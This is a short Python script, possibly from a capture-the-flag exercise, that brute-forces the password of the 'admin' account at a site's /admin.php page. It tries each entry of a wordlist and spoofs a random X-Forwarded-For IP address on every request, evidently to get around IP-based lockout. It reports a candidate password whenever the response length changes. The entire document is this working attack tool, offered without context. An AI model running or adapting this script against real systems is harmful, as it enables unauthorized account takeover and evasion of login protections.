import requests
import sys
import random
import json

username = "admin"
currentIP = '127.0.0.1'
counter = 0

password = ""
url = sys.argv[1]
wordlist = sys.argv[2]
f = open(wordlist,'r')
with open(wordlist, 'r') as f:
    for line in f:
        currentIP = ".".join(map(str,(random.randint(0,255) for _ in range (4))))
        header = {"X-Forwarded-For":currentIP}
        password = line
        r = requests.post(url + "/admin.php",data={'username':username,'password':password},headers=header)
        
        if int(r.headers["content-length"]) != 665:
            print "Possible Password Found: " + password
